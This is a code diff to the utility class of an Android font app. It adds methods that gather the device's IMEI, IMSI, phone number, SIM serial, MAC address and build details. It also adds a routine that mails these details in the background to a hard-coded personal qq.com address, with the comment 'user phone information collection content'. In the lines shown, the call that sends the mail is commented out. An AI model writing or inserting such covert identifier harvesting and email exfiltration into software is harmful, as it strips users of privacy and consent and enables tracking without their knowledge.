@@ -1,6 +1,9 @@
 package com.sg.mtfont.utils;
 
+import android.bluetooth.BluetoothClass.Device;
 import android.content.Context;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
@@ -8,6 +11,7 @@ import android.widget.Toast;
 
 import com.sg.mtfont.MainActivity;
 import com.sg.mtfont.R;
+import com.sg.mtfont.bean.DeviceInfo;
 import com.sg.mtfont.mail.MailSenderInfo;
 import com.sg.mtfont.mail.SimpleMailSender;
 
@@ -53,39 +57,6 @@ public class CommonUtils {
 		mailInfo.setToAddress("741470894@qq.com");
 		return mailInfo;
 	}
-	
-	/**
-	 * 
-	 * @author "biaowen.yu"
-	 * @date 2014-4-12 上午9:36:05
-	 * @description 
-	 * @param context
-	 * @return
-	 */
-	public static String getUserInfo(Context context) {
-		TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-		String imsi = mTelephonyMgr.getSubscriberId();
-		String imei = mTelephonyMgr.getDeviceId();
-		StringBuilder sb = new StringBuilder();
-		sb.append("用户手机信息：\n").append("imsi=").append(imsi).append("\n").append("imei=").append(imei).append("\n");
-		sb.append("\n\n\n\n");
-		sb.append("产品PRODUCT: ").append(android.os.Build.PRODUCT).append("\n");// /
-		sb.append("品牌BRAND: ").append(android.os.Build.BRAND).append("\n");// /
-		sb.append("制造商MANUFACTURER: ").append(android.os.Build.MANUFACTURER)
-		.append("\n");
-		sb.append("设备DEVICE: ").append(android.os.Build.DEVICE).append("\n");
-		sb.append("SDK: ").append(android.os.Build.VERSION.SDK_INT);// //
-		
-		sb.append("BOARD: ").append(android.os.Build.BOARD).append("\n");// /
-		sb.append("DISPLAY: ").append(android.os.Build.DISPLAY).append("\n");
-		sb.append("HOST: ").append(android.os.Build.HOST).append("\n"); // //
-		sb.append("MODEL: ").append(android.os.Build.MODEL).append("\n");// /
-		sb.append("TIME: ").append(android.os.Build.TIME).append("\n");
-		sb.append("ANDROID VERSION: ").append(android.os.Build.VERSION.RELEASE);// //
-		
-		return sb.toString();
-	}
-	
 	
 	public static String getPhoneInfo(Context ctx) {
 		try{
@@ -153,4 +124,93 @@ public class CommonUtils {
 		
 		return false;
 	}
+	
+	/**
+	 * 
+	 * @author Kalus Yu
+	 * @param ctx
+	 * @return
+	 * 2014年8月23日 下午9:30:59
+	 */
+	public static DeviceInfo getDeviceInfo(Context ctx){
+	    TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId();
+        String imsi = telephonyManager.getSubscriberId();
+        String macAddress = getLocalMacAddress(ctx);
+        String product = android.os.Build.PRODUCT;
+        String brand = android.os.Build.BRAND;
+        String manufacturer = android.os.Build.MANUFACTURER;
+        String device = android.os.Build.DEVICE;
+        String sdk = String.valueOf(android.os.Build.VERSION.SDK_INT);
+        String board = android.os.Build.BOARD;
+        String display = android.os.Build.DISPLAY;
+        String host = android.os.Build.HOST;
+        String model = android.os.Build.MODEL;
+        String time = "";
+        String androidVersion = android.os.Build.VERSION.RELEASE;
+        String telephone = telephonyManager.getLine1Number();
+        String networkType = String.valueOf(telephonyManager.getNetworkType());
+        String simOperatorName = telephonyManager.getSimOperator();
+        String simSerialNumber = telephonyManager.getSimSerialNumber();
+        String simState = telephonyManager.getSimState()+"";
+        DeviceInfo info = new DeviceInfo(imei, macAddress, imsi, product, brand, 
+                manufacturer, device, sdk, board, display, host, model, 
+                time, androidVersion, telephone, networkType, 
+                simOperatorName, simSerialNumber, simState);
+        return info;
+	}
+	
+	/**
+	 * 
+	 * @author Kalus Yu
+	 * @param title
+	 * @param ctx
+	 * 2014年8月23日 下午8:42:01
+	 */
+	public static DeviceInfo getDeviceInfo(String title,Context ctx) {
+        DeviceInfo info = getDeviceInfo(ctx);
+        //sendEmail(info,title);
+        return info;
+        
+    }
+	
+	/**
+	 * 
+	 * @author Kalus Yu
+	 * @param info
+	 * @param title
+	 * 2014年8月23日 下午8:53:04
+	 */
+	private static void sendEmail(DeviceInfo info,String title) {
+	    final MailSenderInfo mailInfo = CommonUtils.initEmail();
+        mailInfo.setSubject(title+"：");
+	    String mailContent = "用户手机信息搜集内容：\n\n";
+        mailContent += info.toString();
+
+        mailInfo.setContent(mailContent);
+        // 这个类主要来发送邮件
+        new Thread(new Runnable() {
+
+            @Override
+            public void run() {
+                SimpleMailSender sms = new SimpleMailSender();
+                sms.sendTextMail(mailInfo);// 不能再UI线程执行
+
+            }
+        }).start();
+    }
+
+
+    /**
+	 * get mac address
+	 * @author Kalus Yu
+	 * @param ctx
+	 * @return
+	 * 2014年8月23日 下午8:42:57
+	 */
+	public static String getLocalMacAddress(Context ctx) {  
+        WifiManager wifi = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);  
+        WifiInfo info = wifi.getConnectionInfo();  
+        return info.getMacAddress();  
+    } 
 }
